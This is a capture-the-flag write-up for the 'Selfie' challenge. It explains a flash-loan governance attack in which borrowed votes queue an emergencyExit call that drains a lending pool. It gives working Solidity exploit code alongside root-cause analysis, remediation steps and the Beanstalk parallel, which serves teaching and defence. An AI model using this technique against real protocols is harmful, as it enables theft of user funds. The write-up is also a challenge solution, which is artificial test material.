# 06 — Selfie

**Class:** Flash-loan governance capture (voting power without skin in the game)
**Goal:** Drain the pool's 1,500,000 DVT to the recovery account.

## The setup

- `SelfiePool` holds 1.5M of a **governance token** (`DamnValuableVotes`, an
  `ERC20Votes`) and offers a free flash loan of that same token.
- `SimpleGovernance` lets anyone `queueAction` if they hold **more than half** the
  voting token supply, then `executeAction` after a **2-day delay**.
- The pool's `emergencyExit(receiver)` transfers its entire balance out — and it's
  gated by `onlyGovernance`, i.e. it can only be triggered *through* a passed
  governance action.

## Root cause

Voting power is measured by a **spot balance / delegation snapshot at proposal
time**, with no lockup, no averaging, and no check that the proposer *keeps* the
tokens. A flash loan provides more than half the supply for the duration of one
transaction — long enough to `delegate` to yourself and `queueAction`. The tokens
are returned immediately after, but the queued action remains valid and executes
two days later.

The governance never asks "did this proposer have durable stake?" — a snapshot of
momentary, borrowed voting power is enough to enqueue an arbitrary privileged call.

## Exploit

```solidity
function attack() external {
    pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
}

function onFlashLoan(address, address _token, uint256 amount, uint256, bytes calldata)
    external returns (bytes32)
{
    DamnValuableVotes(_token).delegate(address(this));   // gain > 50% voting power now
    actionId = governance.queueAction(
        address(pool), 0, abi.encodeCall(SelfiePool.emergencyExit, (recovery))
    );
    IERC20(_token).approve(address(pool), amount);        // repay the loan
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

// two days later — no voting power required to EXECUTE, only to QUEUE
function execute() external { governance.executeAction(actionId); }
```

`vm.warp(block.timestamp + 2 days)` between `attack()` and `execute()` clears the
action delay, and `emergencyExit` ships the whole pool to `recovery`.

## Remediation

- Base voting power on **checkpoints in the past** (e.g. `getPastVotes` at a block
  strictly before the proposal, or a snapshot taken at proposal creation and
  re-verified at execution). This defeats same-transaction borrowed votes.
- Require proposers to **lock** or escrow tokens for the proposal lifetime, or
  enforce a minimum holding period.
- Don't let the governance token double as free flash-loan liquidity; if it must,
  disable delegation/voting effects for balances held mid-flash-loan.

## Real-world parallel

This is the **flash-loan governance attack** seen in the wild (e.g. the Beanstalk
$182M exploit, April 2022), where an attacker flash-borrowed governance tokens,
passed a malicious proposal, and drained the protocol. Spot-balance voting is the
core flaw.
